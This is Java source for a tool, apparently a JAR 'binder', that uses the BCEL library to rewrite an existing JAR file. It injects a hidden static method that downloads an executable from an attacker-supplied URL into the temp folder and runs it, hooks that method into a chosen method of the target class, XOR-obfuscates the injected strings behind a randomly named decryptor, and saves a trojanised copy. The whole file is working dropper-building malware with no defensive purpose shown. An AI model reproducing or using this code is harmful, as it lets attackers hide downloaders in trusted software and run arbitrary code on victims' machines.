import com.sun.org.apache.bcel.internal.Constants;
import com.sun.org.apache.bcel.internal.classfile.Method;
import com.sun.org.apache.bcel.internal.generic.*;
import util.bcel.JarLoader;
import util.misc.LogHandler;
import util.misc.Misc;
import util.misc.Settings;

public class Injector {

    private final LogHandler Logger = new LogHandler("Injector");
    private String Location;
    private JarLoader LoadedJar;
    private String downloadUrl;
    private String criteria;
    private String nname;
    private String nsig;

    public Injector(String loc, String url, String mname) {
        Location = loc;
        downloadUrl = url;
        criteria = mname;
    }

    public void inject() {
        for (ClassGen cg : LoadedJar.ClassEntries.values()) {
            if (cg.getClassName().contains("$")) continue;
            for (Method method : cg.getMethods()) {
                if (!method.getName().equals(criteria)) continue;
                //INJECT METHOD
                Logger.log("Located Static Initializer -> Class: " + cg.getClassName());
                MethodGen dler = getDownloader(cg, downloadUrl, Misc.getRandomString(7, true) + ".exe");
                if (cg.containsMethod(dler.getName(), dler.getSignature()) == null) {
                    Logger.log("Injecting Infector Method -> Class: " + cg.getClassName());
                    cg.addMethod(dler.getMethod());
                } else {
                    Logger.error("Download Method Already Exists! -> Class: " + cg.getClassName());
                }

                //INJECT CALL
                MethodGen mg = new MethodGen(method, cg.getClassName(), cg.getConstantPool());
                InstructionList list = mg.getInstructionList();
                Logger.log("Injecting Call -> Class: " + cg.getClassName() + " Method: " + method.getName());
                list.getEnd().setInstruction(new INVOKESTATIC(cg.getConstantPool().addMethodref(dler)));
                list.append(new RETURN());
                list.setPositions();

                mg.setInstructionList(list);
                mg.setMaxLocals();
                mg.setMaxStack();
                cg.replaceMethod(method, mg.getMethod());
            }
        }
    }

    public void obfuscate() {
        for (ClassGen cg : LoadedJar.ClassEntries.values()) {
            if (cg.containsMethod(nname, nsig) == null) continue;
            MethodGen cryptor = getDecryptor(cg, Settings.KEY);
            for (Method method : cg.getMethods()) {
                if (!method.getName().equals(nname)) continue;
                MethodGen mg = new MethodGen(method, cg.getClassName(), cg.getConstantPool());
                InstructionList list = mg.getInstructionList();
                if (list == null) continue;
                Logger.log("Obfuscating Strings -> Class: " + cg.getClassName() + " Method: " + method.getName());
                InstructionHandle[] handles = list.getInstructionHandles();
                for (InstructionHandle handle : handles) {
                    if (!(handle.getInstruction() instanceof LDC)) continue;
                    try {
                        String orig = ((LDC) handle.getInstruction()).getValue(cg.getConstantPool()).toString();
                        int index = cg.getConstantPool().addString(getCiphered(orig, Settings.KEY));
                        handle.setInstruction(new LDC(index));
                        list.append(handle, new INVOKESTATIC(cg.getConstantPool().addMethodref(cryptor)));
                    } catch (Exception e) {
                        Logger.debug("Caught error, skipping instruction.");
                    }
                }
                list.setPositions();
                mg.setInstructionList(list);
                mg.setMaxLocals();
                mg.setMaxStack();
                cg.replaceMethod(method, mg.getMethod());
            }
            if (cg.containsMethod(cryptor.getName(), cryptor.getSignature()) == null) {
                Logger.log("Injecting Cipher Method -> Class: " + cg.getClassName());
                cg.addMethod(cryptor.getMethod());
            } else {
                Logger.error("Cipher Method Already Exists! -> Class: " + cg.getClassName());
            }
        }
    }

    public void load() {
        try {
            LoadedJar = new JarLoader(Location);
        } catch (Exception e) {
            Application.close("Error loading Jar. Please specify a valid Jar file.");
        }
    }

    public void save() {
        String loc = Location.replace(".jar", "-new.jar");
        LoadedJar.saveJar(loc);
    }

    String getCiphered(String input, int key) {
        char[] inputChars = input.toCharArray();
        for (int i = 0; i < inputChars.length; i++) {
            inputChars[i] = (char) (inputChars[i] ^ key);
        }
        return new String(inputChars);
    }

    MethodGen getDownloader(ClassGen cg, String url, String file) {
        InstructionFactory _factory = new InstructionFactory(cg);
        InstructionList il = new InstructionList();
        il.append(_factory.createNew("java.net.URL"));
        il.append(new DUP());
        il.append(new PUSH(cg.getConstantPool(), url));
        il.append(_factory.createInvoke("java.net.URL", "<init>", Type.VOID, new Type[]{Type.STRING}, Constants.INVOKESPECIAL));
        il.append(_factory.createInvoke("java.net.URL", "openStream", new ObjectType("java.io.InputStream"), Type.NO_ARGS, Constants.INVOKEVIRTUAL));
        il.append(_factory.createInvoke("java.nio.channels.Channels", "newChannel", new ObjectType("java.nio.channels.ReadableByteChannel"), new Type[]{new ObjectType("java.io.InputStream")}, Constants.INVOKESTATIC));
        il.append(InstructionFactory.createStore(Type.OBJECT, 0));
        il.append(_factory.createNew("java.lang.StringBuilder"));
        il.append(new DUP());
        il.append(_factory.createInvoke("java.lang.StringBuilder", "<init>", Type.VOID, Type.NO_ARGS, Constants.INVOKESPECIAL));
        il.append(new PUSH(cg.getConstantPool(), "java.io.tmpdir"));
        il.append(_factory.createInvoke("java.lang.System", "getProperty", Type.STRING, new Type[]{Type.STRING}, Constants.INVOKESTATIC));
        il.append(_factory.createInvoke("java.lang.StringBuilder", "append", new ObjectType("java.lang.StringBuilder"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
        il.append(new PUSH(cg.getConstantPool(), file));
        il.append(_factory.createInvoke("java.lang.StringBuilder", "append", new ObjectType("java.lang.StringBuilder"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
        il.append(_factory.createInvoke("java.lang.StringBuilder", "toString", Type.STRING, Type.NO_ARGS, Constants.INVOKEVIRTUAL));
        il.append(InstructionFactory.createStore(Type.OBJECT, 1));
        il.append(_factory.createNew("java.io.FileOutputStream"));
        il.append(new DUP());
        il.append(InstructionFactory.createLoad(Type.OBJECT, 1));
        il.append(_factory.createInvoke("java.io.FileOutputStream", "<init>", Type.VOID, new Type[]{Type.STRING}, Constants.INVOKESPECIAL));
        il.append(InstructionFactory.createStore(Type.OBJECT, 2));
        il.append(InstructionFactory.createLoad(Type.OBJECT, 2));
        il.append(_factory.createInvoke("java.io.FileOutputStream", "getChannel", new ObjectType("java.nio.channels.FileChannel"), Type.NO_ARGS, Constants.INVOKEVIRTUAL));
        il.append(InstructionFactory.createLoad(Type.OBJECT, 0));
        il.append(new PUSH(cg.getConstantPool(), (long) 0));
        il.append(new PUSH(cg.getConstantPool(), (long) 1 << 24));
        il.append(_factory.createInvoke("java.nio.channels.FileChannel", "transferFrom", Type.LONG, new Type[]{new ObjectType("java.nio.channels.ReadableByteChannel"), Type.LONG, Type.LONG}, Constants.INVOKEVIRTUAL));
        il.append(new POP2());
        il.append(InstructionFactory.createLoad(Type.OBJECT, 2));
        il.append(_factory.createInvoke("java.io.FileOutputStream", "close", Type.VOID, Type.NO_ARGS, Constants.INVOKEVIRTUAL));
        il.append(_factory.createInvoke("java.lang.Runtime", "getRuntime", new ObjectType("java.lang.Runtime"), Type.NO_ARGS, Constants.INVOKESTATIC));
        il.append(InstructionFactory.createLoad(Type.OBJECT, 1));
        il.append(_factory.createInvoke("java.lang.Runtime", "exec", new ObjectType("java.lang.Process"), new Type[]{Type.STRING}, Constants.INVOKEVIRTUAL));
        il.append(new POP());
        il.append(InstructionFactory.createReturn(Type.VOID));
        il.setPositions();
        nname = Misc.getRandomString(12, false);

        MethodGen method = new MethodGen(Constants.ACC_PUBLIC | Constants.ACC_STATIC, Type.VOID, Type.NO_ARGS, new String[]{},
                nname, cg.getClassName(), il, cg.getConstantPool());
        nsig = method.getSignature();
        method.setMaxLocals();
        method.setMaxStack();
        return method;
    }

    MethodGen getDecryptor(ClassGen cg, int key) {
        InstructionList il = new InstructionList();
        InstructionFactory fa = new InstructionFactory(cg);
        il.append(new ALOAD(0));
        il.append(fa.createInvoke("java.lang.String", "toCharArray", new ArrayType(Type.CHAR, 1), Type.NO_ARGS, Constants.INVOKEVIRTUAL));
        il.append(new ASTORE(2));
        il.append(new ICONST(0));
        il.append(new ISTORE(3));
        il.append(new ILOAD(3));
        il.append(new ALOAD(2));
        il.append(new ARRAYLENGTH());
        il.append(new IF_ICMPGE(il.getInstructionHandles()[0]));//Placeholder, to be replaced
        il.append(new ALOAD(2));
        il.append(new ILOAD(3));
        il.append(new ALOAD(2));
        il.append(new ILOAD(3));
        il.append(new CALOAD());
        il.append(new BIPUSH((byte) key));
        il.append(new IXOR());
        il.append(new I2C());
        il.append(new CASTORE());
        il.append(new IINC(3, 1));
        il.append(new GOTO(il.getInstructionHandles()[5]));
        il.append(fa.createNew(ObjectType.STRING));
        il.append(new DUP());
        il.append(new ALOAD(2));
        il.append(fa.createInvoke("java.lang.String", "<init>", Type.VOID, new Type[]{new ArrayType(Type.CHAR, 1)}, Constants.INVOKESPECIAL));
        il.append(new ARETURN());
        il.getInstructionHandles()[8].setInstruction(new IF_ICMPGE(il.getInstructionHandles()[20]));
        il.setPositions();

        MethodGen mg = new MethodGen(Constants.ACC_STATIC | Constants.ACC_PUBLIC, Type.STRING, new Type[]{Type.STRING},
                new String[]{Misc.getRandomString(6, false)}, Misc.getRandomString(12, false), cg.getClassName(), il, cg.getConstantPool());
        mg.setMaxLocals();
        mg.setMaxStack();
        return mg;
    }

}
